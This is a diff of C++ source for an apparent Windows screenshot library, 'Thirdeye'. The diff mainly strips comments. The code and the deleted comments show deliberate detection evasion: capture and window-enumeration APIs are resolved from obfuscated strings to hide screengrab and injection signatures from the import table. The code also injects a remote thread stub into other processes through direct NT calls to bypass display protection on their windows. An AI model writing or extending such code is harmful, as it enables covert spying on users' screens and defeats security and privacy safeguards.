@@ -8,26 +8,16 @@
 
 #define TJE_IMPLEMENTATION
 #include "tiny_jpeg.h"
-// lodepng.c is compiled as pure C (avoids the C++ wrapper's std::vector/std::
-// string instantiations). The header has no extern "C" guard, so supply it here
-// to keep the C linkage that matches the C-compiled object.
 extern "C" {
 #define LODEPNG_NO_COMPILE_CPP
 #include "lodepng.h"
 }
 
-// ---- Dynamic capture-API resolution -------------------------------------
-// The screenshot capability is detected from the static import table, which
-// otherwise reads as the canonical screengrab signature (BitBlt, GetDC,
-// CreateCompatibleBitmap, CreateCompatibleDC, GetSystemMetrics, Gdip*). Every
-// capture API is resolved at runtime from shredded strings so the IAT only
-// shows benign synchronisation/threading imports.
 template <typename T>
 static T ResolveApi(HMODULE hMod, const char* name) {
     return (T)DynGetProcAddress(hMod, name);
 }
 
-// USER32/GDI32 capture surface.
 typedef HDC(WINAPI* pGetDC)(HWND);
 typedef int(WINAPI* pReleaseDC)(HWND, HDC);
 typedef HDC(WINAPI* pCreateCompatibleDC)(HDC);
@@ -89,9 +79,6 @@ static const CaptureApis& GetCaptureApis() {
     return a;
 }
 
-// Window-enumeration surface. EnumWindows/IsWindowVisible/GetWindowThreadProcessId
-// are the canonical "find injection targets" signature, so they are resolved
-// dynamically from shredded strings rather than statically imported.
 typedef BOOL(WINAPI* pEnumWindows)(WNDENUMPROC, LPARAM);
 typedef BOOL(WINAPI* pIsWindowVisible)(HWND);
 typedef DWORD(WINAPI* pGetWindowThreadProcessId)(HWND, LPDWORD);
@@ -121,13 +108,6 @@ static const WindowApis& GetWindowApis() {
     return a;
 }
 
-// ---------------------------------------------------------------------------
-// Pixel extraction + encoders. No GDI+: BitBlt -> GetDIBits yields a BGRA
-// top-down buffer, then encoded by vendored header-only codecs (TinyJPEG,
-// lodepng) or a hand-rolled 24-bit BMP writer. None add a single import.
-// ---------------------------------------------------------------------------
-
-// Growable byte sink used for in-memory buffers and streaming file writes.
 struct ByteSink {
     uint8_t* data;
     size_t size;
@@ -153,7 +133,6 @@ struct ByteSink {
     }
 };
 
-// Extract BGRA pixels from an HBITMAP into a freshly malloc'd top-down buffer.
 static uint8_t* ExtractBgra(const CaptureApis& cap, HDC memDC, HBITMAP hBitmap,
                             int w, int h) {
     size_t bytes = (size_t)w * (size_t)h * 4;
@@ -173,7 +152,6 @@ static uint8_t* ExtractBgra(const CaptureApis& cap, HDC memDC, HBITMAP hBitmap,
     return buf;
 }
 
-// BGRA (top-down) -> tightly packed RGB (top-down). Allocates w*h*3 bytes.
 static uint8_t* BgraToRgb(const uint8_t* bgra, int w, int h) {
     size_t px = (size_t)w * (size_t)h;
     uint8_t* rgb = (uint8_t*)malloc(px * 3);
@@ -190,14 +168,11 @@ static uint8_t* BgraToRgb(const uint8_t* bgra, int w, int h) {
     return rgb;
 }
 
-// tje_encode_with_func sink adapter.
 static void TjeWriteCb(void* context, void* data, int size) {
     ((ByteSink*)context)->append(data, (size_t)size);
 }
 
 static bool EncodeJpeg(const uint8_t* rgb, int w, int h, int quality, ByteSink* out) {
-    // TinyJPEG now takes libjpeg-style 0..100 quality directly (with 4:2:0
-    // chroma subsampling below 95), so pass it through.
     if (quality < 0) quality = 0;
     if (quality > 100) quality = 100;
     return tje_encode_with_func(TjeWriteCb, out, quality, w, h, 3, rgb) == 1 &&
@@ -214,8 +189,6 @@ static bool EncodePng(const uint8_t* rgb, int w, int h, ByteSink* out) {
     return ok;
 }
 
-// Hand-rolled 24-bit BMP: 54-byte header + bottom-up BGR rows padded to 4
-// bytes. Written in bulk from the BGRA buffer (no per-pixel calls).
 static bool EncodeBmp(const uint8_t* bgra, int w, int h, ByteSink* out) {
     const long pad = (long)((w * -3L) & 3);
     const uint32_t rowSize = (uint32_t)(w * 3 + pad);
@@ -263,8 +236,6 @@ static bool EncodeBmp(const uint8_t* bgra, int w, int h, ByteSink* out) {
     return !out->overflow;
 }
 
-// Capture the (virtual) screen into a memory DC + HBITMAP. Caller releases the
-// DCs and deletes the bitmap. Returns false with lastError set on failure.
 static bool CaptureToMemDc(ThirdeyeContext* ctx, const CaptureApis& c, int w, int h,
                            HDC* outScreenDC, HDC* outMemDC, HBITMAP* outBmp) {
     int x = c.GetSystemMetrics(SM_XVIRTUALSCREEN);
@@ -298,9 +269,6 @@ static bool CaptureToMemDc(ThirdeyeContext* ctx, const CaptureApis& c, int w, in
     return true;
 }
 
-// Capture + encode driver. Fills `out` with encoded image bytes; returns false
-// with lastError set on failure. The caller must wrap bypassProtection around
-// the call (inject before, signal trigger after).
 static bool CaptureEncoded(ThirdeyeContext* ctx, const ThirdeyeOptions& opts, ByteSink* out) {
     const CaptureApis& c = GetCaptureApis();
     if (!c.ready) {
@@ -347,12 +315,6 @@ static bool CaptureEncoded(ThirdeyeContext* ctx, const ThirdeyeOptions& opts, By
     return ok;
 }
 
-
-// NOTE: no <thread>/<mutex>/<condition_variable>. Using the C++ threading
-// runtime pulls in winpthreads, which imports the classic injection API set
-// (SuspendThread/ResumeThread/Get/SetThreadContext/Tls*/etc.) and the SEH/debug
-// helpers (RtlCaptureContext, OutputDebugStringA, OpenProcess, VirtualProtect)
-// into the IAT. Raw Win32 primitives avoid that runtime entirely.
 static INIT_ONCE g_SyscallInitOnce = INIT_ONCE_STATIC_INIT;
 static bool g_SyscallInitResult = false;
 
@@ -361,12 +323,6 @@ static BOOL CALLBACK SyscallInitOnceCallback(PINIT_ONCE, PVOID, PVOID*) {
     return TRUE;
 }
 
-// Runs CleanupInjections on a background thread (replacement for detached
-// std::thread). The list is heap-allocated and freed by the thread proc.
-
-// Container-free injection bookkeeping: fixed-size POD tables avoid the C++
-// std::map/std::vector machinery, which would otherwise pull libstdc++ and
-// winpthreads (and the injection-signature import set) into the IAT.
 #define MAX_PROCESSES 128
 #define MAX_INJECTIONS 128
 
@@ -402,7 +358,7 @@ static void StartCleanupThread(const RemoteContext* items, size_t count) {
     if (count == 0) return;
     auto* copy = (RemoteContext*)malloc(count * sizeof(RemoteContext));
     if (!copy) {
-        CleanupInjections(const_cast<RemoteContext*>(items), count); // fall back
+        CleanupInjections(const_cast<RemoteContext*>(items), count);
         return;
     }
     memcpy(copy, items, count * sizeof(RemoteContext));
@@ -418,7 +374,7 @@ static void StartCleanupThread(const RemoteContext* items, size_t count) {
     if (h) {
         CloseHandle(h);
     } else {
-        CleanupThreadProc(arg); // fall back to synchronous cleanup
+        CleanupThreadProc(arg);
     }
 }
 
@@ -784,12 +740,6 @@ DWORD __stdcall RemoteThreadProc(LPVOID lpParameter) {
     return 0;
 }
 
-// End marker: an empty function emitted immediately after RemoteThreadProc in
-// .text$mn (source order preserved by -fno-toplevel-reorder), so
-// &RemoteThreadProcEnd - &RemoteThreadProc is the stub size. Using a function
-// (not data) avoids a PE section-type conflict with the executable stub.
-// `used` keeps it alive under --gc-sections (MSVC keeps it via /OPT:REF only if
-// referenced; it is referenced by address in GetRemoteSectionSize, so it stays).
 #ifdef __GNUC__
 extern "C" SEC_REMOTE FUNC_ATTRS __attribute__((used))
 #else
@@ -805,14 +755,9 @@ void __stdcall RemoteThreadProcEnd() {}
 #endif
 
 size_t GetRemoteSectionSize() {
-    // The stub is bounded by an end-marker symbol in the same .text$mn
-    // subsection (folded into .text). No PE section-header walking required.
     uintptr_t start = (uintptr_t)&RemoteThreadProc;
     uintptr_t end = (uintptr_t)&RemoteThreadProcEnd;
     if (end <= start) return 0;
-    // Round up to 16 bytes for alignment hygiene; the copy stays within the
-    // stub's own bytes (the marker follows the stub), so it never bleeds into
-    // neighbouring .text code.
     size_t size = end - start;
     return (size + 15) & ~((size_t)15);
 }
@@ -848,13 +793,12 @@ static BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
     w.GetWindowThreadProcessId(hwnd, &pid);
     if (pid == GetCurrentProcessId()) return TRUE;
 
-    // Find existing slot for this pid, else allocate a new one.
     ProcessHwnds* slot = nullptr;
     for (size_t i = 0; i < pw->count; ++i) {
         if (pw->entries[i].pid == pid) { slot = &pw->entries[i]; break; }
     }
     if (!slot) {
-        if (pw->count >= MAX_PROCESSES) return TRUE; // table full; skip
+        if (pw->count >= MAX_PROCESSES) return TRUE;
         slot = &pw->entries[pw->count++];
         slot->pid = pid;
         slot->count = 0;
@@ -1029,7 +973,6 @@ static bool BypassDisplayProtection(ThirdeyeContext* ctx, HANDLE hGlobalTrigger,
             slot.pRemoteCode = pRemoteCode;
             slot.pid = pid;
         } else {
-            // Table full: don't leak the injected thread; close it now.
             if (NtWaitDirect(hThread, 200) == WAIT_OBJECT_0) {
                 NtFreeMemoryDirect(hProcess, pRemoteCode);
                 NtFreeMemoryDirect(hProcess, pRemoteData);
@@ -1128,7 +1071,6 @@ THIRDEYE_API ThirdeyeResult THIRDEYE_CALL Thirdeye_CaptureToFile(
         return THIRDEYE_ERROR_CAPTURE_FAILED;
     }
 
-    // Write encoded bytes to the target file.
     HANDLE hFile = CreateFileW(filePath, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
                                FILE_ATTRIBUTE_NORMAL, nullptr);
     if (hFile == INVALID_HANDLE_VALUE) {
